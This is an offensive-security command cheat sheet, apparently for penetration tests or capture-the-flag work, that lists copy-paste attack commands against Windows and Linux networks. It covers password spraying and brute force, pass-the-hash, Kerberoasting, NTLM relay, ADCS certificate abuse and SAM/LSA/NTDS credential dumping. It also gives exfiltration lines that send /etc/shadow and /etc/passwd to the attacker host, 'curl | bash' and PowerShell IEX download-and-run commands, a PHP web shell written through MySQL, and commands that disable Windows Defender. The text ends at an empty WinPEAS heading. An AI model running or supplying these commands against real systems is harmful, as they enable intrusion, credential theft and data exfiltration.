# Commands Reference

> Copy-paste command reference for the attack box. All methodology steps are in `methodology.md`.
> Payloads injected into targets are in `payloads.md`.

**Common variable placeholders used throughout this file:**

| Variable | Meaning |
|----------|---------|
| `$IP` | Target IP address |
| `$DC_IP` | Domain Controller IP |
| `$DOMAIN` | Domain name (e.g. `corp.local`) |
| `$FQDN` | Fully-qualified DC hostname (e.g. `dc01.corp.local`) |
| `$USER` | Username |
| `$PASS` | Password |
| `$HASH` | NT hash (format: `aad3b435...`) |
| `$LHOST` | Your attack box IP |
| `$LPORT` | Your listener port |

---

## Network Scanning

### Nmap

```bash
# Fast full TCP — find all open ports first
nmap -p- --min-rate 5000 -T4 $IP -oA nmap_alltcp

# Targeted version + default scripts against open ports
nmap -sV -sC -p 22,80,443,445 $IP -oA nmap_targeted

# Aggressive (version, scripts, OS detection) — noisy, use after initial scan
nmap -A $IP -oA nmap_aggressive

# UDP top 20 (slow — run in background)
nmap -sU --top-ports 20 $IP -oA nmap_udp

# Vuln scripts against a specific port
nmap --script vuln -p 445 $IP

# NSE script category
nmap --script "smb-*" -p 139,445 $IP

# Ping sweep
nmap -sn 192.168.1.0/24

# Output all formats at once (-oA)
nmap -sV -sC -p- $IP -oA full_scan
```

### RustScan (faster initial port discovery)

```bash
# Fast all-port scan then pipe to nmap
rustscan -a $IP --ulimit 5000 -- -sV -sC

# Specify port range
rustscan -a $IP -r 1-65535 --ulimit 5000

# Scan subnet
rustscan -a 192.168.1.0/24 --ulimit 5000
```

### Masscan (fastest — use for large ranges)

```bash
# Full TCP sweep
masscan -p1-65535 $IP --rate=10000 -oL masscan_results.txt

# Top ports only
masscan -p80,443,445,22,3389,8080 192.168.1.0/24 --rate=5000
```

---

## Web Enumeration

### ffuf

```bash
# Directory/file fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://$IP/FUZZ -mc 200,204,301,302,307,401,403

# With extension fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
     -u http://$IP/FUZZ -e .php,.txt,.html,.bak,.old -mc 200,204,301,302,307,401,403

# Vhost fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://$IP/ -H "Host: FUZZ.$DOMAIN" \
     -fw 18   # filter by word count of default response

# Subdomain fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://FUZZ.$DOMAIN/ -mc 200,204,301,302,307,401,403

# GET parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://$IP/page.php?FUZZ=test" -fs 0

# POST parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u http://$IP/login.php -X POST \
     -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" -fs 0

# Authenticated fuzzing (cookie)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://$IP/FUZZ -b "PHPSESSID=<session_id>" -mc 200,204,301,302,307

# Output to file
ffuf -w wordlist.txt -u http://$IP/FUZZ -o ffuf_results.json -of json

# Filter options
# -mc   match HTTP codes       -fc  filter HTTP codes
# -ms   match response size    -fs  filter response size
# -mw   match word count       -fw  filter word count
# -ml   match line count       -fl  filter line count
```

### Gobuster

```bash
# Directory scan
gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
             -x php,txt,html,bak -t 50 -o gobuster_dir.txt

# DNS subdomain enumeration
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
             -t 50 -o gobuster_dns.txt

# Vhost fuzzing
gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
               --append-domain -t 50 -o gobuster_vhost.txt
```

### Feroxbuster (recursive)

```bash
# Recursive directory scan (good for deep apps)
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
            -x php,txt,html -t 50 -o ferox_results.txt

# With depth limit
feroxbuster -u http://$IP -w wordlist.txt -d 3 -t 50
```

### Nikto

```bash
# Basic scan
nikto -h http://$IP

# SSL target
nikto -h https://$IP -ssl

# Save output
nikto -h http://$IP -o nikto_results.txt -Format txt
```

### WhatWeb / Banner Grabbing

```bash
# Technology fingerprinting
whatweb http://$IP
whatweb -v http://$IP     # verbose

# curl header grab
curl -I http://$IP

# wafw00f — WAF detection
wafw00f http://$IP

# Check for git exposure
curl http://$IP/.git/HEAD
curl http://$IP/.git/config
```

---

## FTP (Port 21)

```bash
# Anonymous login
ftp $IP
# username: anonymous, password: (blank or any email)

# Download all files recursively
wget -m ftp://anonymous:anonymous@$IP

# With credentials
ftp $IP
# or
curl -u $USER:$PASS ftp://$IP/

# Upload file
curl -T shell.php ftp://$IP/uploads/ -u $USER:$PASS
```

---

## SSH (Port 22)

```bash
# Connect
ssh $USER@$IP

# With key
ssh -i id_rsa $USER@$IP

# Local port forward (tunnel $LPORT to target:port)
ssh -L $LPORT:127.0.0.1:8080 $USER@$IP -N

# Dynamic SOCKS proxy
ssh -D 1080 $USER@$IP -N

# Remote port forward (expose your local service on target)
ssh -R 8080:127.0.0.1:80 $USER@$IP -N

# Execute command without TTY
ssh $USER@$IP "whoami && id"

# SCP — copy files
scp $USER@$IP:/remote/file ./local/
scp ./local/file $USER@$IP:/remote/path/
```

---

## SMB (Ports 139/445)

### smbclient

```bash
# List shares (no creds)
smbclient -L //$IP -N

# List shares (with creds)
smbclient -L //$IP -U "$DOMAIN\\$USER%$PASS"

# Connect to share
smbclient //$IP/ShareName -U "$DOMAIN\\$USER%$PASS"

# Connect with hash (pass-the-hash)
smbclient //$IP/ShareName -U "$USER%$HASH" --pw-nt-hash

# Download file
smbclient //$IP/ShareName -U "$USER%$PASS" -c "get filename"

# Download all files recursively
smbclient //$IP/ShareName -U "$USER%$PASS" -c "recurse ON; prompt OFF; mget *"
```

### smbmap

```bash
# List shares and permissions (null session)
smbmap -H $IP

# With credentials
smbmap -H $IP -u $USER -p $PASS -d $DOMAIN

# Pass-the-hash
smbmap -H $IP -u $USER -p $HASH -d $DOMAIN

# List contents of share recursively
smbmap -H $IP -u $USER -p $PASS -r ShareName

# Download a file
smbmap -H $IP -u $USER -p $PASS --download "ShareName/path/to/file"
```

### enum4linux-ng

```bash
# Full enumeration
enum4linux-ng $IP

# With credentials
enum4linux-ng -u $USER -p $PASS $IP

# Output to YAML
enum4linux-ng $IP -oY enum4linux_results.yaml
```

### Nmap SMB scripts

```bash
nmap --script smb-enum-shares,smb-enum-users -p 445 $IP
nmap --script smb-vuln-ms17-010 -p 445 $IP
nmap --script smb-security-mode -p 445 $IP
```

---

## LDAP (Ports 389/636)

```bash
# Anonymous LDAP query — dump base DN
ldapsearch -H ldap://$IP -x -s base namingcontexts

# Anonymous enumeration
ldapsearch -H ldap://$IP -x -b "DC=corp,DC=local"

# Authenticated enumeration
ldapsearch -H ldap://$IP -x -D "$USER@$DOMAIN" -w $PASS \
           -b "DC=corp,DC=local" "(objectClass=person)"

# Dump all users
ldapsearch -H ldap://$IP -x -D "$USER@$DOMAIN" -w $PASS \
           -b "DC=corp,DC=local" "(objectClass=user)" \
           sAMAccountName userPrincipalName memberOf

# Dump all groups
ldapsearch -H ldap://$IP -x -D "$USER@$DOMAIN" -w $PASS \
           -b "DC=corp,DC=local" "(objectClass=group)"

# windapsearch (easier LDAP wrapper)
windapsearch -d $DOMAIN --dc $DC_IP -u $USER -p $PASS --users
windapsearch -d $DOMAIN --dc $DC_IP -u $USER -p $PASS --groups
windapsearch -d $DOMAIN --dc $DC_IP -u $USER -p $PASS --privileged-users
windapsearch -d $DOMAIN --dc $DC_IP -m custom -l "(objectClass=computer)" \
             --attrs cn,operatingSystem,operatingSystemVersion
```

---

## CrackMapExec (CME)

```bash
# --- SMB ---
# Null session check
crackmapexec smb $IP

# Spray credentials over a subnet
crackmapexec smb 192.168.1.0/24 -u $USER -p $PASS

# Pass-the-hash
crackmapexec smb $IP -u $USER -H $HASH

# Check local admin (look for Pwn3d!)
crackmapexec smb $IP -u $USER -p $PASS --local-auth

# Enumerate shares
crackmapexec smb $IP -u $USER -p $PASS --shares

# Enumerate logged-on users
crackmapexec smb $IP -u $USER -p $PASS --loggedon-users

# Enumerate sessions
crackmapexec smb $IP -u $USER -p $PASS --sessions

# Enumerate domain users
crackmapexec smb $IP -u $USER -p $PASS --users

# Enumerate groups
crackmapexec smb $IP -u $USER -p $PASS --groups

# Dump SAM
crackmapexec smb $IP -u $USER -p $PASS --sam

# Dump LSA secrets
crackmapexec smb $IP -u $USER -p $PASS --lsa

# Run command
crackmapexec smb $IP -u $USER -p $PASS -x "whoami /all"
crackmapexec smb $IP -u $USER -p $PASS -X "Get-Process"  # PowerShell

# Check SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# --- WinRM ---
crackmapexec winrm $IP -u $USER -p $PASS
crackmapexec winrm $IP -u $USER -H $HASH
crackmapexec winrm $IP -u $USER -p $PASS -x "whoami"

# --- LDAP ---
crackmapexec ldap $DC_IP -u $USER -p $PASS --users
crackmapexec ldap $DC_IP -u $USER -p $PASS --groups
crackmapexec ldap $DC_IP -u $USER -p $PASS --bloodhound -ns $DC_IP -c All
crackmapexec ldap $DC_IP -u $USER -p $PASS --asreproast asrep_hashes.txt
crackmapexec ldap $DC_IP -u $USER -p $PASS --kerberoasting kerb_hashes.txt
crackmapexec ldap $DC_IP -u $USER -p $PASS --trusted-for-delegation
crackmapexec ldap $DC_IP -u $USER -p $PASS --password-not-required

# --- MSSQL ---
crackmapexec mssql $IP -u $USER -p $PASS
crackmapexec mssql $IP -u $USER -p $PASS -q "SELECT @@version"
crackmapexec mssql $IP -u $USER -p $PASS --local-auth

# --- RDP ---
crackmapexec rdp $IP -u $USER -p $PASS
crackmapexec rdp 192.168.1.0/24 -u $USER -p $PASS

# --- Password spray (avoid lockout) ---
# Spray one password at a time; check lockout policy first
crackmapexec smb $DC_IP -u users.txt -p 'Password123!' --continue-on-success

# --- Read from file ---
crackmapexec smb $IP -u users.txt -p passwords.txt
crackmapexec smb $IP -u $USER -H hashes.txt
```

---

## Impacket

```bash
# --- Remote execution ---

# psexec (requires ADMIN$ write + named pipe; creates service; noisy)
impacket-psexec $DOMAIN/$USER:$PASS@$IP
impacket-psexec $DOMAIN/$USER@$IP -hashes :$HASH

# wmiexec (WMI; no service install; semi-interactive)
impacket-wmiexec $DOMAIN/$USER:$PASS@$IP
impacket-wmiexec $DOMAIN/$USER@$IP -hashes :$HASH
impacket-wmiexec $DOMAIN/$USER:$PASS@$IP -shell-type powershell

# smbexec (SMB only; creates service; no ADMIN$ needed if share writable)
impacket-smbexec $DOMAIN/$USER:$PASS@$IP
impacket-smbexec $DOMAIN/$USER@$IP -hashes :$HASH

# atexec (Task Scheduler; good for evasion; output-only, no shell)
impacket-atexec $DOMAIN/$USER:$PASS@$IP "whoami"
impacket-atexec $DOMAIN/$USER@$IP -hashes :$HASH "net user"

# --- Credential dumping ---

# secretsdump — dump SAM, LSA, NTDS (remote or local)
impacket-secretsdump $DOMAIN/$USER:$PASS@$IP
impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$HASH
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL       # offline NTDS
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL  # offline SAM

# --- Kerberos ---

# AS-REP roasting (no creds — for accounts with pre-auth disabled)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -format hashcat -outputfile asrep.txt

# AS-REP roasting (authenticated)
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC_IP -format hashcat -outputfile asrep.txt -request

# Kerberoasting (get TGS hashes for service accounts)
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -outputfile kerb.txt
impacket-GetUserSPNs $DOMAIN/$USER@$DC_IP -hashes :$HASH -outputfile kerb.txt

# Request TGT and save as .ccache
impacket-getTGT $DOMAIN/$USER:$PASS -dc-ip $DC_IP
impacket-getTGT $DOMAIN/$USER -hashes :$HASH -dc-ip $DC_IP
export KRB5CCNAME=username.ccache

# Request service ticket (S4U2Self / S4U2Proxy)
impacket-getST $DOMAIN/$USER:$PASS -spn cifs/$FQDN -dc-ip $DC_IP
impacket-getST $DOMAIN/$USER:$PASS -spn cifs/$FQDN -impersonate Administrator -dc-ip $DC_IP

# Pass-the-ticket (use .ccache in any impacket tool)
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$FQDN

# --- User/group enumeration ---

# RID cycling (enumerate users without creds via null session)
impacket-lookupsid $DOMAIN/guest@$IP -no-pass
impacket-lookupsid $DOMAIN/$USER:$PASS@$IP

# --- SMB server (for file transfers) ---
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -username $USER -password $PASS

# --- NTLM relay ---
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i          # interactive shell
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami" # run command
impacket-ntlmrelayx -t ldap://$DC_IP -smb2support --delegate-access # RBCD

# --- Registry (remote) ---
impacket-reg $DOMAIN/$USER:$PASS@$IP query -keyName "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"

# --- RPC ---
impacket-rpcdump $DOMAIN/$USER:$PASS@$IP | grep -i "ms-rprn\|ms-efsr"
```

---

## Kerbrute

```bash
# User enumeration (no creds needed)
kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt -o kerbrute_valid_users.txt

# Password spray
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123!'

# Brute-force single user
kerbrute bruteuser --dc $DC_IP -d $DOMAIN passwords.txt $USER
```

---

## BloodHound

### Collection (bloodhound-python)

```bash
# Collect all data (most comprehensive)
bloodhound-python -d $DOMAIN -u $USER -p $PASS -dc $FQDN -ns $DC_IP -c All --zip

# Collect with hash
bloodhound-python -d $DOMAIN -u $USER --hashes :$HASH -dc $FQDN -ns $DC_IP -c All --zip

# Collect specific methods only (faster for targeted collection)
bloodhound-python -d $DOMAIN -u $USER -p $PASS -dc $FQDN -ns $DC_IP \
                  -c DCOnly --zip    # DC-only (faster, no agent on hosts needed)

# Via proxychains
proxychains bloodhound-python -d $DOMAIN -u $USER -p $PASS -dc $FQDN -ns $DC_IP -c All --zip
```

### Key Cypher queries (run in BloodHound query box)

```cypher
-- Find all Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN u

-- Find all paths from owned user to DA
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

-- Find all users with Kerberoastable SPNs
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- Find users with AS-REP roasting enabled
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Find computers where DA is logged in
MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.name STARTS WITH "ADMINISTRATOR" RETURN u, c

-- Find all computers with unconstrained delegation (exclude DCs)
MATCH (c:Computer {unconstraineddelegation:true, objectclass:"computer"})
WHERE NOT c.name CONTAINS "DC" RETURN c

-- Find all principals with DCSync rights
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN n

-- Find shortest path from owned nodes to high value
MATCH p=shortestPath((u {owned:true})-[*1..]->(n {highvalue:true})) RETURN p

-- Find all ADCS ESC1 vulnerable templates
MATCH (t:GPO) WHERE t.type = "Certificate Template" AND t.enrolleeSuppliesSubject = true
AND t.authenticationenabled = true RETURN t
```

---

## Certipy (ADCS)

```bash
# Enumerate all certificate templates (find ESC1-8)
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -stdout
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable -stdout

# ESC1 — request cert as another user (SAN abuse)
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
            -ca "CA-Name" -template "TemplateName" \
            -upn administrator@$DOMAIN

# Authenticate with certificate → get TGT + NTLM hash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# ESC4 — modify template to be ESC1-vulnerable, then exploit
certipy template -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -template "TemplateName" -save-old
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP \
            -ca "CA-Name" -template "TemplateName" -upn administrator@$DOMAIN
certipy template -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -template "TemplateName" -configuration old.json

# ESC8 — NTLM relay to AD CS HTTP enrollment
certipy relay -dc-ip $DC_IP -ca "CA-Name"
# (trigger coercion from DC in a separate terminal)

# Shadow credentials (add key credential via ADCS PKINIT)
certipy shadow auto -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -account TargetUser

# Decode/inspect a .pfx
certipy cert -pfx certificate.pfx -nokey -out certificate.crt
```

---

## Password Attacks

### Hashcat

```bash
# --- Common modes ---
# NTLM                  -m 1000
# NetNTLMv1             -m 5500
# NetNTLMv2             -m 5600
# Kerberos TGS RC4      -m 13100
# Kerberos TGS AES-128  -m 19600
# Kerberos TGS AES-256  -m 19700
# Kerberos AS-REP       -m 18200
# md5crypt ($1$)        -m 500
# sha512crypt ($6$)     -m 1800
# bcrypt ($2a$)         -m 3200
# MSSQL 2012+           -m 1731
# MySQL SHA1            -m 300
# WPA2                  -m 22000

# Dictionary attack
hashcat -m 1000 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# Dictionary + rules (best bang for buck)
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Brute-force (mask attack) — e.g. Capital+6lower+2digit+symbol
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?d?s

# Combinator attack (word1+word2)
hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Show cracked hashes
hashcat -m 1000 hashes.txt --show

# Restore interrupted session
hashcat --restore
```

### John the Ripper

```bash
# Auto-detect format
john hashes.txt --wordlist=rockyou.txt

# Specify format
john hashes.txt --format=NT --wordlist=rockyou.txt
john hashes.txt --format=krb5tgs --wordlist=rockyou.txt

# Show cracked
john hashes.txt --show

# Hash identification helpers
hash-identifier
hashid hash_string
```

### Hydra (online brute-force)

```bash
# SSH
hydra -l $USER -P rockyou.txt ssh://$IP
hydra -L users.txt -P rockyou.txt ssh://$IP -t 4

# FTP
hydra -l $USER -P rockyou.txt ftp://$IP

# HTTP POST form
hydra -l admin -P rockyou.txt $IP http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://$IP/protected/

# RDP
hydra -l $USER -P rockyou.txt rdp://$IP

# SMB
hydra -l $USER -P rockyou.txt smb://$IP

# WinRM
hydra -l $USER -P rockyou.txt winrm://$IP

# Speed options: -t (tasks/threads), -w (wait timeout), -f (stop on first hit)
```

---

## SNMP (Port 161)

```bash
# Brute community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -i targets.txt
onesixtyone $IP -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt

# Enumerate with known community string
snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2   # running processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2   # installed software
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.2.2.1.2      # network interfaces
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25    # Windows user accounts

# snmp-check (human-readable output)
snmp-check $IP -c public
```

---

## RPC / NetBIOS

```bash
# rpcclient — null session
rpcclient -U "" -N $IP

# rpcclient — authenticated
rpcclient -U "$USER%$PASS" $IP

# Useful rpcclient commands (interactive):
# enumdomusers              — list all domain users
# enumdomgroups             — list all domain groups
# queryuser <RID>           — user details
# querygroup <RID>          — group details
# enumdomains               — list domains
# querydominfo              — domain password policy
# netshareenum              — list shares
# getdompwinfo              — domain password policy

# nbtscan — NetBIOS name scan
nbtscan 192.168.1.0/24
```

---

## MSSQL (Port 1433)

```bash
# Impacket mssqlclient
impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP
impacket-mssqlclient $USER:$PASS@$IP -windows-auth

# Common MSSQL commands (in interactive shell):
# SELECT @@version;
# SELECT name FROM master.dbo.sysdatabases;
# USE dbname; SELECT table_name FROM information_schema.tables;
# EXEC xp_cmdshell 'whoami';              -- if enabled
# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;  -- enable it

# sqsh (alternative client)
sqsh -S $IP -U $USER -P $PASS
```

---

## MySQL (Port 3306)

```bash
# Connect
mysql -h $IP -u $USER -p$PASS

# Common MySQL commands:
# SHOW DATABASES;
# USE dbname;
# SHOW TABLES;
# SELECT * FROM users;
# SELECT user, password FROM mysql.user;  -- dump creds
# SELECT @@datadir;                       -- data directory
# LOAD DATA INFILE '/etc/passwd' INTO TABLE test;  -- LFI via SQL (if perms allow)
# SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';  -- write shell
```

---

## WinRM (Port 5985/5986)

```bash
# Connect with Evil-WinRM (password)
evil-winrm -i $IP -u $USER -p $PASS

# Pass-the-hash
evil-winrm -i $IP -u $USER -H $HASH

# With SSL (port 5986)
evil-winrm -i $IP -u $USER -p $PASS -S

# With kerberos ticket
evil-winrm -i $FQDN -u $USER -p $PASS -r $DOMAIN

# Upload file
upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file
download C:\Users\Administrator\Desktop\flag.txt /local/path/
```

---

## RDP (Port 3389)

```bash
# Connect
xfreerdp /v:$IP /u:$USER /p:$PASS /cert:ignore

# Pass-the-hash (Restricted Admin mode must be enabled on target)
xfreerdp /v:$IP /u:$USER /pth:$HASH /cert:ignore

# Drive share (mount local folder)
xfreerdp /v:$IP /u:$USER /p:$PASS /cert:ignore /drive:share,/tmp

# Clipboard sharing
xfreerdp /v:$IP /u:$USER /p:$PASS /cert:ignore +clipboard

# Full screen
xfreerdp /v:$IP /u:$USER /p:$PASS /cert:ignore /f
```

---

## Responder & NTLM Relay

```bash
# Responder — capture NTLMv2 hashes (listen only; disable SMB and HTTP for relay)
responder -I eth0 -wrf

# Responder in analyze mode (no poisoning — safe for passive recon)
responder -I eth0 -A

# Responder for relay (disable SMB and HTTP so ntlmrelayx handles them)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
responder -I eth0 -wrf

# ntlmrelayx — dump SAM/LSA on targets
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# ntlmrelayx — interactive SMB shell
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# Then: nc 127.0.0.1 11000

# ntlmrelayx — run command
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami /all"

# ntlmrelayx — relay to LDAP for RBCD
impacket-ntlmrelayx -t ldap://$DC_IP -smb2support --delegate-access

# Coercion to trigger auth (in separate terminal)
impacket-PetitPotam $LHOST $IP          # requires CVE-2021-36942 unpatched
impacket-dfscoerce $LHOST $IP           # alternative coercion
printerbug.py $DOMAIN/$USER:$PASS@$IP $LHOST  # MS-RPRN coercion
```

---

## Pivoting & Tunneling

### Chisel

```bash
# On attack box — start server
chisel server --port 9001 --reverse

# On pivot host — connect back and forward a port
chisel client $LHOST:9001 R:8080:127.0.0.1:8080    # single port
chisel client $LHOST:9001 R:socks                   # SOCKS5 proxy (port 1080)

# On pivot host — forward range
chisel client $LHOST:9001 R:3306:$INTERNAL_IP:3306
```

### SSH Tunnels

```bash
# Local port forward — access target:3306 via localhost:3306
ssh -L 3306:$INTERNAL_IP:3306 $USER@$PIVOT_IP -N -f

# Dynamic SOCKS proxy — proxychains through pivot
ssh -D 1080 $USER@$PIVOT_IP -N -f

# Remote port forward — expose attacker listener on pivot
ssh -R 4444:127.0.0.1:4444 $USER@$PIVOT_IP -N -f

# Double pivot (chain two tunnels)
ssh -L 3307:localhost:3306 -J $USER@$PIVOT1_IP $USER@$PIVOT2_IP -N
```

### Ligolo-ng

```bash
# On attack box — start proxy server
./proxy -selfcert -laddr 0.0.0.0:11601

# On pivot host — connect agent back
./agent -connect $LHOST:11601 -ignore-cert

# In ligolo-ng console:
# session                        — select the session
# ifconfig                       — list pivot host interfaces
# start                          — start tunnel

# Add route to internal network (attack box)
sudo ip route add 172.16.0.0/24 dev ligolo

# Add listener (forward port on attack box to internal host)
# listener_add --addr 0.0.0.0:$LPORT --to 127.0.0.1:$LPORT
```

### Proxychains

```bash
# Configure /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# Use with any tool
proxychains nmap -sT -Pn -p 80,443,445 $INTERNAL_IP
proxychains crackmapexec smb $INTERNAL_IP -u $USER -p $PASS
proxychains evil-winrm -i $INTERNAL_IP -u $USER -p $PASS
proxychains impacket-secretsdump $DOMAIN/$USER:$PASS@$INTERNAL_IP
```

---

## File Transfers

### Serve files from attack box

```bash
# Python HTTP server (port 8080)
python3 -m http.server 8080

# Impacket SMB server
impacket-smbserver share $(pwd) -smb2support

# Impacket SMB with credentials (required on newer Windows)
impacket-smbserver share $(pwd) -smb2support -username $USER -password $PASS

# FTP (pyftpdlib)
python3 -m pyftpdlib -p 21 -w
```

### Download to Linux target

```bash
wget http://$LHOST:8080/file -O /tmp/file
curl http://$LHOST:8080/file -o /tmp/file
curl http://$LHOST:8080/file | bash    # pipe to shell
```

### Download to Windows target

```powershell
# PowerShell (most reliable)
IEX (New-Object Net.WebClient).DownloadString("http://$LHOST:8080/shell.ps1")
Invoke-WebRequest -Uri "http://$LHOST:8080/file.exe" -OutFile "C:\Windows\Temp\file.exe"
(New-Object Net.WebClient).DownloadFile("http://$LHOST:8080/file.exe","C:\Windows\Temp\file.exe")

# certutil
certutil -urlcache -f http://$LHOST:8080/file.exe C:\Windows\Temp\file.exe

# bitsadmin
bitsadmin /transfer job http://$LHOST:8080/file.exe C:\Windows\Temp\file.exe

# SMB copy (using Impacket SMB server)
copy \\$LHOST\share\file.exe C:\Windows\Temp\file.exe
```

### Exfiltrate from target

```bash
# curl POST to netcat listener
nc -lvnp 9999 > exfil.zip
curl -F "file=@/etc/passwd" http://$LHOST:8080/upload
# or base64 encode and curl
base64 /etc/shadow | curl -d @- http://$LHOST:9999

# SMB back to attack box
# copy C:\loot.txt \\$LHOST\share\loot.txt
```

---

## DNS (Port 53)

```bash
# Zone transfer
dig axfr @$IP $DOMAIN
dig axfr $DOMAIN @$IP

# Reverse lookup
dig -x $IP @$DNS_SERVER

# Enumerate records
dig A $DOMAIN @$IP
dig MX $DOMAIN @$IP
dig NS $DOMAIN @$IP
dig TXT $DOMAIN @$IP
dig ANY $DOMAIN @$IP

# dnsenum (subdomain bruteforce + zone transfer)
dnsenum --dnsserver $IP --enum $DOMAIN \
        -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# fierce
fierce --domain $DOMAIN --dns-servers $IP

# dnsrecon
dnsrecon -d $DOMAIN -t axfr
dnsrecon -d $DOMAIN -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## Linux Post-Exploitation

```bash
# --- Situational awareness ---
id; whoami; hostname; uname -a
cat /etc/passwd | grep -v nologin
cat /etc/os-release
ip a; ip route; arp -n
ss -tlnp; netstat -tlnp
ps aux
sudo -l
cat /etc/crontab; ls -la /etc/cron.*
find / -perm -4000 -type f 2>/dev/null          # SUID binaries
find / -perm -2000 -type f 2>/dev/null          # SGID binaries
find / -writable -type d 2>/dev/null            # writable dirs
find / -name "*.conf" 2>/dev/null | head -20
find / -name "id_rsa*" 2>/dev/null
find / -name "*.kdbx" -o -name "*.db" -o -name "*.sqlite" 2>/dev/null
cat ~/.bash_history; cat /root/.bash_history
env | grep -i pass
grep -r "password" /etc/ 2>/dev/null | head -20
grep -r "password" /var/www/ 2>/dev/null | head -20

# --- LinPEAS ---
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or transfer and run: chmod +x linpeas.sh && ./linpeas.sh | tee linpeas_out.txt

# --- LinEnum ---
./LinEnum.sh -t | tee linenum_out.txt

# --- pspy (monitor cron/processes without root) ---
./pspy64 | tee pspy_out.txt
```

---

## Windows Post-Exploitation

```powershell
# --- Situational awareness ---
whoami /all
net user $USER /domain
net localgroup administrators
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /SVC
Get-Process
sc query state= all
schtasks /query /fo LIST /v
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
dir "C:\Users"
dir "C:\Users\$USER\Desktop"
dir "C:\Users\$USER\Documents"
dir "C:\Program Files"; dir "C:\Program Files (x86)"

# --- Credential hunting ---
dir /s /b C:\ 2>nul | findstr /i "password credentials .config web.config"
findstr /si "password" *.xml *.ini *.txt *.config 2>nul
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
cmdkey /list                        # stored credentials
type C:\Windows\System32\drivers\etc\hosts
Get-ChildItem -Path C:\ -Include *.kdbx,*.db -Recurse -ErrorAction SilentlyContinue

# --- Disable Windows Defender (if admin) ---
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# --- WinPEAS ---
